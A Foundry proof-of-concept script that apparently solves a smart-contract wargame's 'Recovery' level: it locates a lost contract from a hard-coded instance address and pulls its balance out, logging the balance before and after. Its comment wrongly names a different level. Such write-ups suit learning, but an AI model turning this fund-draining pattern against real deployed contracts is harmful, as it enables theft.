// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {RecoveryService} from "../src/17_Recovery.sol";

contract PoC is Script {
    address private immutable recovery =
        0x2333215479D476895b462Ff945f3aF5bA2d0652e; // Replace with your GateKeeperOne instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        RecoveryService recoveryService = new RecoveryService(recovery);
        address lostAddress = recoveryService.recoverAddress();

        console2.log(
            "Lost contract's balance before: ",
            address(lostAddress).balance
        );

        recoveryService.recoverFund();

        console2.log(
            "Lost contract's balance after: ",
            address(lostAddress).balance
        );

        vm.stopBroadcast();
    }
}
